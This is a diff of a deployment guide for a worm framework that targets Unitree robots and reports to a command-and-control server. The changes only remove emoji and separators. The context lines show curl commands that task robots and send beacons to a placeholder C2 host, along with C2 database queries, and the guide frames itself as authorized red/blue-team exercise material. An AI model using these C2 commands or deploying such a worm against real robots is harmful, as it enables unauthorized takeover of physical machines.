@@ -1,12 +1,10 @@
 # Deployment Guide: Unitree Worm Framework
 
-## ⚠️ WARNING
+## WARNING
 
 This guide is for **AUTHORIZED SECURITY RESEARCH ONLY** in controlled environments. Deploying this framework against unauthorized systems is **ILLEGAL**.
 
----
-
-## 📋 Prerequisites
+## Prerequisites
 
 ### Hardware Requirements
 
@@ -35,9 +33,7 @@ Python 3.8 or higher
 bluetooth, bluez, libbluetooth-dev, nmap, python3-dev, build-essential
 ```
 
----
-
-## 🚀 Installation
+## Installation
 
 ### Step 1: Clone Repository
 
@@ -91,9 +87,7 @@ source .env
 export $(cat .env | xargs)
 ```
 
----
-
-## 🎯 Deployment Scenarios
+## Deployment Scenarios
 
 ### Scenario 1: Single Robot Exploitation (Standalone)
 
@@ -240,9 +234,7 @@ curl -X POST http://your-c2:8443/api/v1/operator/task \
   }'
 ```
 
----
-
-## 🧪 Testing & Validation
+## Testing & Validation
 
 ### Pre-Deployment Testing
 
@@ -287,9 +279,7 @@ curl -X POST http://your-c2:8443/api/v1/beacon \
 sqlite3 worm_c2.db "SELECT * FROM robots;"
 ```
 
----
-
-## 📊 Monitoring Deployment
+## Monitoring Deployment
 
 ### Real-Time Monitoring
 
@@ -324,9 +314,7 @@ curl -H "Authorization: Bearer YOUR_TOKEN" \
   http://your-c2:8443/api/v1/operator/stats | jq '.total_robots'
 ```
 
----
-
-## 🔧 Troubleshooting
+## Troubleshooting
 
 ### Issue: C2 Server Not Starting
 
@@ -393,9 +381,7 @@ asyncio.run(test())
 EOF
 ```
 
----
-
-## 🛡️ Security Considerations
+## Security Considerations
 
 ### Operational Security
 
@@ -442,9 +428,7 @@ sudo iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
 sudo iptables -A OUTPUT -j DROP
 ```
 
----
-
-## 📝 Post-Exercise Cleanup
+## Post-Exercise Cleanup
 
 ### Complete Cleanup Procedure
 
@@ -480,9 +464,7 @@ cp worm_c2.db archives/exercise_$(date +%Y%m%d).db
 rm worm_c2.db
 ```
 
----
-
-## 📚 Documentation & Reporting
+## Documentation & Reporting
 
 ### Exercise Report Template
 
@@ -532,9 +514,7 @@ rm worm_c2.db
 - Lessons learned documented: [Yes/No]
 ```
 
----
-
-## 🎓 Training Scenarios
+## Training Scenarios
 
 ### Scenario A: Detection Exercise (Blue Team)
 
@@ -569,9 +549,7 @@ rm worm_c2.db
    - Blue: Detection speed, containment effectiveness
 4. After-action review with both teams
 
----
-
-## 📞 Support & Resources
+## Support & Resources
 
 **Documentation:**
 - `README_WORM.md` - Framework overview
